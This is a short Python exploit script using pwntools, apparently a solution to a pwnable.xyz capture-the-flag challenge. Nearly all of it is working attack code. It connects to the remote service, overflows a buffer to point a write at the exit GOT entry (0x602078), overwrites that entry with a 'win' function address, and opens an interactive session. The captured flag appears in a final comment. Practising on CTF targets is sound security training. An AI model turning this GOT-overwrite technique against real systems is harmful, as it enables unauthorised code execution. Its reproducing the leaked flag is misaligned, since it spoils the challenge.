from pwn import *
import time

#r = process('./challenge')
r = remote('svc.pwnable.xyz', 30013)

gscript='''
b readline
b 0x00400b30
'''
r.sendafter(": ", "\x00")
r.sendafter(": ", "A" * 0x20)

# initially start off with 0x80 bytes, or 128 bytes
# need 0x88
exit_got = 0x00602078
win = 0x0040094c
for i in range(8): 
    r.sendafter("> ", "1")
    r.sendafter(": ", "\x00")
r.sendafter("> ", "1")
r.sendafter(": ", b"A" * 0x80 + b'\x78\x20\x60\x42')

# gdb.attach(r,gdbscript=gscript)
# overwrite got
r.sendafter("> ", "2")
r.sendafter(": ", p64(win))

r.interactive()
# FLAG{if_u_used_the_fsb_u_failed}
